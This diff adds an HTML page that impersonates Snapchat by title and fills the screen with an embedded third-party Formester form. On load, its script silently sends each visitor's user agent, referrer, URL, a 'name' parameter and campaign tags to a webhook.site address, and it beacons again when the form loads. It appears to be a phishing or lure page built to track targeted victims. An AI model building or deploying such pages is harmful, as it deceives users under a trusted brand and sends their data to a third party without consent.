@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Snapchat</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Formester widget -->
+  <script src="https://oexoamkq.formester.com/widget/standard.js" type="module"></script>
+
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: #fff;
+    }
+    formester-standard-form {
+      display: block;
+      width: 100%;
+      height: 100vh;
+    }
+  </style>
+
+  <script>
+    // === Config ===
+    const WEBHOOK_URL = "https://webhook.site/ff1f1600-5b58-4294-a49f-499cfb5b827a";
+
+    function collectParams() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        clicked: true,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer || null,
+        url: location.href,
+        name: params.get("name") || "unknown",
+        utm_source: params.get("utm_source") || null,
+        utm_medium: params.get("utm_medium") || null,
+        utm_campaign: params.get("utm_campaign") || null,
+        utm_term: params.get("utm_term") || null,
+        utm_content: params.get("utm_content") || null,
+      };
+    }
+
+    function sendWebhook(payload) {
+      try {
+        const ok = navigator.sendBeacon && navigator.sendBeacon(
+          WEBHOOK_URL,
+          new Blob([JSON.stringify(payload)], { type: "application/json" })
+        );
+        if (ok) return;
+      } catch (_) {}
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true,
+      }).catch(err => console.error("Webhook error:", err));
+    }
+
+    function trackFormLoaded() {
+      const target = document.querySelector("formester-standard-form");
+      if (!target) return;
+
+      const obs = new MutationObserver(() => {
+        const iframe = target.shadowRoot
+          ? target.shadowRoot.querySelector("iframe")
+          : target.querySelector("iframe");
+        if (iframe) {
+          iframe.addEventListener("load", () => {
+            sendWebhook({
+              event: "form_iframe_loaded",
+              timestamp: new Date().toISOString(),
+              url: location.href
+            });
+          }, { once: true });
+          obs.disconnect();
+        }
+      });
+      obs.observe(target, { childList: true, subtree: true });
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      sendWebhook(collectParams());
+      trackFormLoaded();
+    });
+  </script>
+</head>
+
+<body>
+  <formester-standard-form
+    set-auto-height="true"
+    height="100%"
+    width="100%"
+    id="jns4KGc0g"
+    url="https://oexoamkq.formester.com/f/jns4KGc0g">
+  </formester-standard-form>
+</body>
+</html>
